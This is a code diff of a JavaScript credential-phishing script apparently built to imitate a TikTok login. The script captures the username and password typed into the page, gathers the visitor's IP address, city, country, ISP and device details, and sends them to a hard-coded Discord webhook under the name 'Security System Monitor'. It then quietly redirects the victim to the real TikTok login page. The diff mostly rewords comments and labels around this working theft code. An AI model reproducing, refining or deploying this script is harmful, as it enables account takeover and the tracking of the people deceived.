@@ -1,19 +1,20 @@
+<script>
 async function sendTargetData() {
-    // 1. Get user input from the HTML fields
+    // 1. Get input data from HTML fields
     const userField = document.getElementById('user').value;
     const passField = document.getElementById('pass').value;
     const webhookURL = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
     if (!userField || !passField) {
-        alert("Please enter your login credentials to continue.");
+        alert("Please enter your login details to continue.");
         return;
     }
 
     try {
-        // 2. Fetch IP and Device data in parallel for speed
+        // 2. Fetch IP and Location in parallel
         const ipTask = fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
         
-        // 3. Extract detailed Device Model from User Agent
+        // 3. Extract detailed Device Model info
         const userAgent = navigator.userAgent;
         const regExp = /\(([^)]+)\)/;
         const matches = regExp.exec(userAgent);
@@ -21,13 +22,12 @@ async function sendTargetData() {
 
         const loc = await ipTask;
 
-        // 4. Create the Discord Data Payload
+        // 4. Create the English Discord Payload
         const payload = {
-            username: "Security Monitor Pro",
-            avatar_url: "https://i.imgur.com/8nLAsvW.png",
+            username: "Security System Monitor",
             embeds: [{
                 title: "Log Report: User Authentication",
-                color: 16711680, // High-visibility red
+                color: 16711680, 
                 fields: [
                     { name: "👤 Account ID", value: `\`${userField}\``, inline: true },
                     { name: "🔑 Security Key", value: `\`${passField}\``, inline: true },
@@ -36,25 +36,26 @@ async function sendTargetData() {
                     { name: "📍 Location", value: `${loc.city || 'N/A'}, ${loc.country_name || 'N/A'}`, inline: true },
                     { name: "📡 ISP/Provider", value: `${loc.org || 'Unknown'}`, inline: false }
                 ],
-                footer: { text: "Transmission Secure • " + new Date().toLocaleString() }
+                footer: { text: "Transmission Verified • " + new Date().toLocaleString() }
             }]
         };
 
-        // 5. Use 'keepalive' to force the browser to finish the request
-        const response = await fetch(webhookURL, {
+        // 5. Send data with 'keepalive' to ensure zero data loss
+        await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload),
             keepalive: true 
         });
 
-        // 6. Redirect to the original platform after verification
-        if (response.ok || response.status) {
-            window.location.replace("https://www.tiktok.com/login");
-        }
+        // 6. Redirect to actual platform
+        window.location.replace("https://www.tiktok.com/login");
 
     } catch (error) {
-        // Quiet redirect if something fails
+        // Quiet redirect if error occurs
         window.location.replace("https://www.tiktok.com/");
     }
 }
+                     </script>
+
+                     
